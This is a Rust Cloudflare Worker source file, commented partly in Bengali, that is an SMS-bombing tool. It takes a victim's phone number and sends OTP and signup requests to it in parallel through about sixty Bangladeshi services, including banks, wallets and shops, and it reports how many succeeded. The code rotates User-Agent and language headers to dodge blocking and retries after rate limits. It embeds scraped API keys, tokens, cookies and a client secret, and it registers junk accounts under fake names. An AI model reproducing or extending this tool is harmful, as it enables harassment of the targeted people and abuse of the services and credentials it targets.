use worker::*;
use serde_json::{json, Value};
use wasm_bindgen_futures::JsFuture;
use wasm_bindgen::JsValue;

// ══════════════════════════════════════════════════════
//  🚫 BLOCKED NUMBERS
// ══════════════════════════════════════════════════════
const BLOCKED_NUMBERS: &[&str] = &[
    "01890183516",
    "01893336440",
];

// ══════════════════════════════════════════════════════
//  🔄 USER-AGENT POOL — প্রতিটা request এ rotate হবে
//  IP block হওয়ার chance কমবে
// ══════════════════════════════════════════════════════
const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Samsung Galaxy S23) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "okhttp/4.12.0",
    "okhttp/4.11.0",
    "okhttp/4.9.3",
    "okhttp/3.14.9",
    "Dart/3.2 (dart:io)",
    "Dart/2.19 (dart:io)",
    "Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7 Build/TQ3A.230805.001)",
    "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B Build/SP1A.210812.016)",
];

// ══════════════════════════════════════════════════════
//  🔄 ACCEPT-LANGUAGE POOL
// ══════════════════════════════════════════════════════
const ACCEPT_LANGS: &[&str] = &[
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,bn;q=0.8",
    "bn-BD,bn;q=0.9,en;q=0.8",
    "en;q=0.9",
];

// ══════════════════════════════════════════════════════
//  🎲 FAST PSEUDO-RANDOM (seed based on time + api name)
//  WASM তে rand crate নেই, তাই নিজে implement করলাম
// ══════════════════════════════════════════════════════
fn pseudo_rand(seed: u64) -> u64 {
    let mut x = seed ^ 0x9e3779b97f4a7c15u64;
    x = (x ^ (x >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
    x = (x ^ (x >> 27)).wrapping_mul(0x94d049bb133111ebu64);
    x ^ (x >> 31)
}

fn get_ua(seed: u64) -> &'static str {
    USER_AGENTS[(pseudo_rand(seed) as usize) % USER_AGENTS.len()]
}

fn get_lang(seed: u64) -> &'static str {
    ACCEPT_LANGS[(pseudo_rand(seed.wrapping_add(1)) as usize) % ACCEPT_LANGS.len()]
}

// ══════════════════════════════════════════════════════
//  CORS
// ══════════════════════════════════════════════════════
pub fn cors_headers() -> Headers {
    let mut h = Headers::new();
    h.set("Access-Control-Allow-Origin",  "*").unwrap();
    h.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS").unwrap();
    h.set("Access-Control-Allow-Headers", "Content-Type").unwrap();
    h.set("Content-Type", "application/json").unwrap();
    h
}

// ══════════════════════════════════════════════════════
//  FIRE ONCE — single attempt with timeout
//  seed → random UA selection এর জন্য
// ══════════════════════════════════════════════════════
async fn fire_once(
    name:    &'static str,
    url:     &'static str,
    payload: &Value,
    headers: &[(&'static str, &'static str)],
    seed:    u64,
) -> Value {
    let mut init = RequestInit::new();
    init.with_method(Method::Post);

    let mut h = Headers::new();

    // ── API specific headers আগে set করো ──
    let mut has_ua           = false;
    let mut has_content_type = false;
    let mut has_accept       = false;

    for (k, v) in headers {
        let key_lower = k.to_lowercase();
        if key_lower == "user-agent"   { has_ua = true; }
        if key_lower == "content-type" { has_content_type = true; }
        if key_lower == "accept"       { has_accept = true; }
        let _ = h.set(k, v);
    }

    // ── Missing header গুলো random value দিয়ে fill করো ──
    if !has_ua {
        let _ = h.set("User-Agent", get_ua(seed));
    }
    if !has_content_type {
        let _ = h.set("Content-Type", "application/json");
    }
    if !has_accept {
        let _ = h.set("Accept", "application/json, text/plain, */*");
    }
    // Accept-Language সবসময় rotate করো
    let _ = h.set("Accept-Language", get_lang(seed));

    init.with_headers(h);
    init.with_body(Some(payload.to_string().into()));

    // ── 8 second timeout ──
    let timeout_promise = js_sys::Promise::new(&mut |_, reject| {
        web_sys::window().unwrap()
            .set_timeout_with_callback_and_timeout_and_arguments_0(&reject, 8000)
            .unwrap();
    });

    let fetch_promise = match Request::new_with_init(url, &init) {
        Ok(req) => wasm_bindgen_futures::future_to_promise(async move {
            match Fetch::Request(req).send().await {
                Ok(mut r) => {
                    let s  = r.status_code();
                    let ok = s == 200 || s == 201 || s == 202;
                    let v  = json!({"api": name, "status": s, "ok": ok, "url": url});
                    Ok(JsValue::from_str(&v.to_string()))
                }
                Err(e) => {
                    let v = json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()});
                    Ok(JsValue::from_str(&v.to_string()))
                }
            }
        }),
        Err(e) => {
            return json!({"api": name, "status": 0, "ok": false, "url": url, "err": e.to_string()});
        }
    };

    let race = js_sys::Promise::race(&js_sys::Array::of2(&fetch_promise, &timeout_promise));
    match JsFuture::from(race).await {
        Ok(val) => {
            let s = val.as_string().unwrap_or_default();
            serde_json::from_str(&s).unwrap_or(json!({"api": name, "status": 0, "ok": false}))
        }
        Err(_) => json!({"api": name, "status": 0, "ok": false, "url": url, "err": "timeout"}),
    }
}

// ══════════════════════════════════════════════════════
//  FIRE — retry logic
//  ✓ success → return
//  4xx → no retry (payload/auth ভুল, retry বেকার)
//  429 → wait 800ms → retry with different UA
//  0/5xx → retry once with different UA
// ══════════════════════════════════════════════════════
async fn fire(
    name:    &'static str,
    url:     &'static str,
    payload: Value,
    headers: &[(&'static str, &'static str)],
) -> Value {
    // seed = name এর bytes XOR করে বানাই
    let base_seed: u64 = name.bytes()
        .enumerate()
        .fold(0x517cc1b727220a95u64, |acc, (i, b)| {
            acc.wrapping_add((b as u64).wrapping_mul(i as u64 + 1))
        });

    for attempt in 0..2u8 {
        // প্রতিটা attempt এ আলাদা seed → আলাদা UA
        let seed = pseudo_rand(base_seed.wrapping_add(attempt as u64));
        let r    = fire_once(name, url, &payload, headers, seed).await;

        let ok     = r["ok"].as_bool().unwrap_or(false);
        let status = r["status"].as_u64().unwrap_or(0);

        if ok { return r; }

        // এই status এ retry করা বেকার
        if matches!(status, 400 | 401 | 403 | 404 | 405 | 410 | 422 | 451) {
            return r;
        }

        // 429 rate limit → wait করে retry
        if status == 429 && attempt == 0 {
            let wait = js_sys::Promise::new(&mut |resolve, _| {
                web_sys::window().unwrap()
                    .set_timeout_with_callback_and_timeout_and_arguments_0(&resolve, 800)
                    .unwrap();
            });
            let _ = JsFuture::from(wait).await;
            continue;
        }

        // timeout/5xx → retry once
        if attempt == 0 { continue; }

        return r;
    }

    json!({"api": name, "status": 0, "ok": false, "url": url})
}

// ══════════════════════════════════════════════════════
//  PARALLEL MACRO — সব API একসাথে fire
// ══════════════════════════════════════════════════════
macro_rules! parallel {
    ($($f:expr),+ $(,)?) => {{
        let js_promises = js_sys::Array::new();
        $(
            js_promises.push(
                &wasm_bindgen_futures::future_to_promise(async move {
                    let v = $f.await;
                    Ok(JsValue::from_str(&v.to_string()))
                })
            );
        )+
        let all        = js_sys::Promise::all(&js_promises);
        let results_js = JsFuture::from(all).await.unwrap_or(JsValue::NULL);
        let arr        = js_sys::Array::from(&results_js);
        let mut out: Vec<Value> = Vec::new();
        for i in 0..arr.length() {
            let s = arr.get(i).as_string().unwrap_or_default();
            out.push(serde_json::from_str(&s).unwrap_or(json!({"ok": false})));
        }
        out
    }};
}

// ══════════════════════════════════════════════════════
//  MAIN HANDLER
// ══════════════════════════════════════════════════════
pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
    let headers = cors_headers();

    if req.method() == Method::Options {
        return Ok(Response::empty()?.with_headers(headers));
    }
    if req.method() != Method::Post {
        return Ok(Response::error("POST Only", 405)?.with_headers(headers));
    }

    let body: Value = req.json().await.unwrap_or_default();
    let number_str  = body.get("number").and_then(|v| v.as_str()).unwrap_or("").trim().to_string();

    if number_str.is_empty() {
        return Ok(Response::ok(
            json!({"status": "error", "message": "Number missing"}).to_string(),
        )?.with_headers(headers));
    }

    // ── Block check ──
    let is_blocked = BLOCKED_NUMBERS.iter().any(|&b| {
        let n  = number_str.trim_start_matches('0');
        let bn = b.trim_start_matches('0');
        number_str == b
            || n == bn
            || format!("880{n}") == b
            || number_str == format!("880{bn}")
    });

    if is_blocked {
        return Ok(Response::ok(json!({
            "status":  "blocked",
            "message": "This number is protected.",
            "target":  number_str,
            "success": 0, "failed": 0, "total": 0, "results": []
        }).to_string())?.with_headers(headers));
    }

    // ── Number format helpers ──
    let number:  &'static str = Box::leak(number_str.clone().into_boxed_str());
    let bd_no:   &'static str = Box::leak(number_str.trim_start_matches('0').to_string().into_boxed_str());
    let bd_full: &'static str = Box::leak(format!("880{bd_no}").into_boxed_str());
    let plus_bd: &'static str = Box::leak(format!("+88{number_str}").into_boxed_str());

    // ══════════════════════════════════════════════════
    //  API LIST
    //
    //  number  → 01XXXXXXXXX
    //  bd_no   → 1XXXXXXXXX
    //  bd_full → 8801XXXXXXXX
    //  plus_bd → +8801XXXXXXXX
    //
    //  NOTE: User-Agent দিলে সেটাই use হবে
    //        না দিলে automatic random UA দেবে
    // ══════════════════════════════════════════════════
    let api_results = parallel![

        fire("Shadhin Music",
            "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
            json!({"msisdn": bd_full, "shortcode": 16235, "servicename": "Shadhin Music"}),
            &[("Content-Type","application/json")]
        ),
        fire("Khaodao",
            "https://api.eat-z.com/auth/customer/app-connect",
            json!({"username": plus_bd}),
            &[("host","api.eat-z.com"),("x-eatz-apiclient","ANDROID"),("accept","application/json"),("content-type","application/json; charset=UTF-8")]
        ),
        fire("Walton Plaza",
            "https://waltonplaza.com.bd/api/auth/otp/create",
            json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": bd_no}, "captchaToken": "recapcha"}),
            &[("Content-Type","application/json")]
        ),
        fire("Apex4u",
            "https://api.apex4u.com/api/auth/login",
            json!({"phoneNumber": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Nexo Pat",
            "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
            json!({"phone": number}),
            &[("Content-Type","application/json"),("Origin","https://www.nexopet.com")]
        ),
        fire("AWS POC",
            "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Otithee",
            "https://gateway.otithee.com/api/v1/generate-otp",
            json!({"request_type": "registration", "mobile_number": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Quizgiri",
            "https://developer.quizgiri.xyz/api/v2.0/send-otp",
            json!({"country_code": "+88", "phone": number}),
            &[("Content-Type","application/json"),("x-api-key","gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"),("User-Agent","Dart/2.12 (dart:io)")]
        ),
        fire("Mojaru",
            "https://new.mojaru.com/api/student/login",
            json!({"mobile_or_email": number}),
            &[("Content-Type","application/x-www-form-urlencoded")]
        ),
        fire("Upay",
            "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
            json!({"wallet_number": number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"}),
            &[("Content-Type","application/json")]
        ),
        fire("Chorki",
            "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[("Content-Type","application/json"),("Origin","https://www.chorki.com")]
        ),
        fire("Deepto Play",
            "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
            json!({"number": plus_bd}),
            &[("Host","api.deeptoplay.com"),("Content-Type","application/json"),("Origin","https://www.deeptoplay.com")]
        ),
        fire("RedX",
            "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
            json!({"phoneNumber": number}),
            &[("Content-Type","application/json"),("Referer","https://redx.com.bd/")]
        ),
        fire("Bohubrihi",
            "https://bb-api.bohubrihi.com/public/activity/otp",
            json!({"phone": number, "intent": "login"}),
            &[("Content-Type","application/json")]
        ),
        fire("Shikho",
            "https://api.shikho.com/public/activity/otp",
            json!({"phone": number, "intent": "ap-discount-request"}),
            &[("Content-Type","application/json"),("Accept","application/json"),("Build-Version","(450) 4.5.0")]
        ),
        fire("Shikho 2",
            "https://api.shikho.com/auth/v2/send/sms",
            json!({"phone": bd_full, "type": "student", "auth_type": "signup", "vendor": "shikho"}),
            &[("Content-Type","application/json"),("Accept","application/json, text/plain, */*"),("Origin","https://shikho.com")]
        ),
        fire("iEducation BD",
            "https://www.ieducationbd.com/api/account/check_user",
            json!({"mobile": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Bangladeshi Matrimony",
            "https://www.bangladeshimatrimony.com/register/editmobileno.php",
            json!({"mobileNo": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Easy BD",
            "https://core.easy.com.bd/api/v1/registration",
            json!({"password": "445566", "password_confirmation": "445566", "name": "Team Dangerous", "mobile": number, "referrer_key": "", "email": "dangerousboytushar@gmail.com"}),
            &[("Content-Type","application/json"),("Host","core.easy.com.bd"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
        ),
        fire("MyGuardian BD",
            "https://gliapp.myguardianbd.com/auth-gate/api/access/send-otp",
            json!({"mobileNumber": number, "type": null}),
            &[("Content-Type","application/json")]
        ),
        fire("Gorilla Move",
            "https://api.gorillamove.com/api/v1/core/account/phone_login",
            json!({"phone_number": number, "step": 1}),
            &[("Content-Type","application/json")]
        ),
        fire("Munchies BD",
            "https://api.munchies.com.bd/parse/functions/generateOtp",
            json!({"phone": number}),
            &[("Content-Type","application/json"),("X-Parse-Application-Id","munchiesbd"),("X-Parse-REST-API-Key","munchiesbd")]
        ),
        fire("NRB Bazaar",
            "https://www.nrbbazaar.com/Customer/RequestOtpForRegistration",
            json!({"phoneNumber": number, "email": "example@gmail.com", "__RequestVerificationToken": "CfDJ8OTdK55f1KtKpMVto1XODz36P2tWXfyeot9aYuxWqkd81qABD_JFUva73ce2L5ftYmqCgwInZKUHisKU3mWb6DkYgBFDg4QIej8YwHP3BQ3fQvgBfc6mbMjVua7p-AT4MEPtgYhLexJmTxl7enCosqA"}),
            &[("Content-Type","application/x-www-form-urlencoded"),("Cookie",".Nop.Antiforgery=CfDJ8N5UM1Mg0_JFs4qu7TCIBSzGu689vm8mbvSPQ743hQSg8CQN0NF_XzfjEsi78OgkEPagdV_jE0-Bv17i3ToM1axTnWqbYcicXyGSwLVIJt-Jpak2l8yoNfuDZsgWG4Hlg4xPW4OOpCtcsf5xmMkdvFk")]
        ),
        fire("Medico Bio",
            "https://api.v2.medico.bio/patient/passwordless-login",
            json!({"phoneNumber": number, "deviceId": number, "channel": "web", "userType": "patient", "type": "newUser"}),
            &[("Content-Type","application/json"),("Origin","https://medico.bio")]
        ),
        fire("Paymaster BD",
            "https://ap.paymasterbd.net/login_registration/",
            json!({"phone_number": number, "fcm_key": "", "device_id": "b5f0985eb84c4bfa", "sms_hash_code": "s2//QkN6BpW"}),
            &[("Content-Type","application/x-www-form-urlencoded"),("User-Agent","okhttp/3.14.9")]
        ),
        fire("Relaxy BD",
            "https://dev.api.relaxy.com.bd/api/v1/otp/send",
            json!({"phoneNumber": plus_bd, "appSignature": "appSignature"}),
            &[("Content-Type","application/json"),("User-Agent","Dart/2.19 (dart:io)"),("x-api-key","6yjOGvakSbHjA64NGqo7m25TBC4WX8BauAXEP3dX")]
        ),
        fire("Porter BD",
            "https://customerapp-gateway-ktor.prod.porter.ae/onboarding/customer/signup",
            json!({"phone": number}),
            &[("content-type","application/json"),("country","bd"),("preferred-languages","{\"app_language\":\"en\"}"),("brand","porter"),("source","android"),("version-name","6.7.0"),("custom-app-version-code","410"),("client-request-uuid","88c7743e-d714-4735-ad05-339e43cf8e73"),("installation-id","0eb9e8bc-9725-4bd5-a382-fe92c716b3c7"),("app-session-id","4699341c-6f94-4481-af99-041b43d24623"),("user-agent","Dalvik/2.1.0")]
        ),
        fire("FSIB Freedom",
            "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
            json!({"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "131", "requestChannel": "MOB", "trackingStatus": 5}),
            &[("Content-Type","application/json"),("User-Agent","okhttp/4.10.0")]
        ),
        fire("Fundesh",
            "https://fundesh.com.bd/api/auth/generateOTP",
            json!({"msisdn": bd_no}),
            &[("Content-Type","application/json"),("Origin","https://fundesh.com.bd")]
        ),
        fire("Ghoori Learning",
            "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
            json!({"mobile_no": number}),
            &[("Content-Type","application/json"),("Host","api.ghoorilearning.com"),("Referer","https://ghoorilearning.com/")]
        ),
        fire("ExpressHub",
            "https://expresshub.com.bd/User/CreateNewUser",
            json!({"_UID": number, "_UNAME": "0", "_MAIL": "0", "_PHONE": "0", "_PASS": "0", "_TYPE": "1"}),
            &[("Content-Type","application/x-www-form-urlencoded"),("Origin","https://expresshub.com.bd")]
        ),
        fire("Pharmaid RX",
            "https://shop.pharmaid-rx.com/api/sendSMSRegistration",
            json!({"mobileNumber": number}),
            &[("Content-Type","application/json"),("Host","shop.pharmaid-rx.com")]
        ),
        fire("Practice Club",
            "https://www.practiceclub.net/api/register",
            json!({"contact_no": number}),
            &[("Content-Type","application/json"),("User-Agent","okhttp/4.9.0")]
        ),
        fire("Quality Foods",
            "https://admin.qualityfoods.com.bd/api/auth/check-phone",
            json!({"phone": number, "is_sign_in": 0, "login_type": "phone"}),
            &[("Content-Type","application/json")]
        ),
        fire("PBS BD",
            "https://pbs.com.bd/login/?handler=UserGetOtp",
            json!({"UserName": "Teamdanderous", "UserPassword": "Tushar", "MobileNo": number}),
            &[("Content-Type","application/json"),("XSRF-Token","CfDJ8C8FhGbSUB1CplCwhmaw48FrjIGNq5sPRk0G6VzBicZtPJrEXDCoqGMiBTb3Fetxypt-480avEXqJS_WJVdEWQeDCz0mKIQO4odODIqIopHM8qh50R7CF3bOGHOtF22Pt-pgeyMhHQTk2t2inqJMRyw"),("Cookie",".AspNetCore.Antiforgery.B6RPubf2LMI=CfDJ8C8FhGbSUB1CplCwhmaw48HSKnE-hppep13XT5NAyk3laCHJb_oP0B1wPBZQP-hzP8Z2CAclzIeEqkFAMeWJS8xWzyiIMY_sMlsO7WzVcxmONd9WUDnzazvUlK9zFOY8h6Pwx1xsDD9fgtr2ltr9qHE;")]
        ),
        fire("Dutch Bangla NX",
            "https://nxpay1.dutchbanglabank.com/user/register",
            json!({"aspId": "5678", "locale": "EN", "msisdn": number, "registrationUserId": number, "tcidList": [50], "telcoId": "GP"}),
            &[("Content-Type","application/json"),("X-KM-User-AspId","5678"),("X-KM-Accept-language","en"),("X-KM-OS-SERVICE-TYPE","GMS"),("X-KM-User-Agent","ANDROID/100046615"),("Host","nxpay1.dutchbanglabank.com"),("User-Agent","okhttp/4.9.3")]
        ),
        fire("One Fish",
            "https://api.onefish.app/api/auth/user/sendotp",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Hishabee",
            "https://distribution.hishabee.business/api/app/v1/auth/number-check",
            json!({"mobile_number": number}),
            &[("Content-Type","application/json")]
        ),
        fire("English Moja",
            "https://api.englishmojabd.com/api/v1/auth/login",
            json!({"phone": plus_bd}),
            &[("Content-Type","application/json"),("User-Agent","Dart/3.2 (dart:io)")]
        ),
        fire("Sundarban Courier",
            "https://api-gateway.sundarbancourierltd.com/graphql",
            json!({"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode } }"}),
            &[("Content-Type","application/json"),("Origin","https://customer.sundarbancourierltd.com")]
        ),
        fire("Easy BD Reg",
            "https://core.easy.com.bd/api/v1/registration",
            json!({"name": "Rahat", "email": "chowa@gmail.com", "mobile": number, "password": "123456", "password_confirmation": "123456", "device_key": "48b1f7061f48c950090220f62128b2c3"}),
            &[("Content-Type","application/json"),("Host","core.easy.com.bd"),("lang","en"),("device-key","48b1f7061f48c950090220f62128b2c3")]
        ),
        fire("Osud Kini",
            "https://api.osudkini.com/api/otp/generate-otp",
            json!({"phoneNo": number}),
            &[("Content-Type","application/json"),("Connection","keep-alive")]
        ),
        fire("ABC Lit",
            "https://abclit.com/api/sendOTP",
            json!({"recipientNo": number, "code": 1234}),
            &[("Content-Type","application/json")]
        ),
        fire("Pathao Auth",
            "https://api.pathao.com/v2/auth/register",
            json!({"country_prefix": "880", "national_number": bd_no, "country_id": 1}),
            &[("Content-Type","application/json"),("app-agent","ride/android/478"),("android-os","10"),("user-agent","okhttp/4.12.0")]
        ),
        fire("Focallure BD",
            "https://store.focallurebd.com/api/v1/1/ecom/auth/getCode",
            json!({"mobile": number}),
            &[("Content-Type","application/json"),("user-agent","Dart/2.14 (dart:io)")]
        ),
        fire("Wholesale Plus",
            "https://admin.wholesaleplus.com.bd/api/send-otp/",
            json!({"email": number, "regi": true}),
            &[("Content-Type","application/json")]
        ),
        fire("Motion View",
            "https://api.motionview.com.bd/api/send-otp-phone-signup",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),
        fire("QPay BD",
            "https://identity01.qpaybd.com.bd/api/v1/verification/phone",
            json!({"Id": number}),
            &[("Content-Type","application/json"),("user-agent","Dart/3.2 (dart:io)")]
        ),
        fire("Amiprobashi",
            "https://www.amiprobashi.com/api/v7/en/auth/send-otp",
            json!({"device_type": "1", "username": plus_bd, "for": "1", "type": "1", "bd_number": "1"}),
            &[("content-type","application/x-www-form-urlencoded"),("android-app-version","4.5.0"),("user-agent","okhttp/4.10.0")]
        ),
        fire("Bepari App",
            "https://api.bepari.app/bestfreshfarm/api/V1.4/access-control/user/registerOtp",
            json!({"client_id": 4, "client_secret": "zCzOixaOJ4JywQr1VsowGZhCaEbZ49WLxweNBgPK", "mobile_no": number}),
            &[("Content-Type","application/json"),("Origin","https://www.bestfreshfarm.com")]
        ),
        fire("Training Gov BD",
            "https://training.gov.bd/backoffice/api/user/sendOtp",
            json!({"mobile": number}),
            &[("Content-Type","application/json")]
        ),
        fire("ILYN Global",
            "https://api.ilyn.global/auth/signup",
            json!({"phone": {"code": "BD", "number": number}, "provider": "sms"}),
            &[("Content-Type","application/json")]
        ),
        fire("Klassy BD",
            "https://api.klassy.com.bd/api/v2/public/user/register/send/otp",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Rangs Motors",
            "https://api.rangsmotors.com/",
            json!({"u_num": number}),
            &[("Content-Type","application/json"),("Origin","https://www.garimela.com")]
        ),
        fire("WinBaji",
            "https://userapi.fairbet91.com/api/RegisterUser/GenerateOTPV2",
            json!({"Mobile": number, "SiteCode": "WBJ"}),
            &[("Content-Type","application/json"),("Origin","https://winbaji.com")]
        ),
        fire("Walton Amar Awaz",
            "https://walton-amar-awaz-prod.com/api/user/signup",
            json!({"email": "", "fbId": "", "fullName": "User", "gId": "", "phone": number}),
            &[("Content-Type","application/json"),("accept","application/json"),("version-code","1.4.7"),("authorization","Bearer"),("user-agent","okhttp/4.7.2")]
        ),
        fire("ACS Future School",
            "https://auth.acsfutureschool.com/api/v1/otp/send",
            json!({"phone": number}),
            &[("Content-Type","application/json")]
        ),
        fire("Meena Bazar",
            "https://meenabazardev.com/api/mobile/front/send/otp",
            json!({"CellPhone": number, "type": "login"}),
            &[("Content-Type","application/x-www-form-urlencoded")]
        )

        // ════════════════════════════════════════
        //  নতুন API format:
        //  fire("নাম", "https://url",
        //      json!({"phone": number}),
        //      &[("Content-Type","application/json")]
        //  ),
        // ════════════════════════════════════════

    ];

    let success = api_results.iter().filter(|r| r["ok"].as_bool().unwrap_or(false)).count() as u32;
    let failed  = api_results.len() as u32 - success;

    Ok(Response::ok(json!({
        "status":  "executed",
        "target":  number_str,
        "success": success,
        "failed":  failed,
        "total":   success + failed,
        "results": api_results,
    }).to_string())?.with_headers(headers))
}
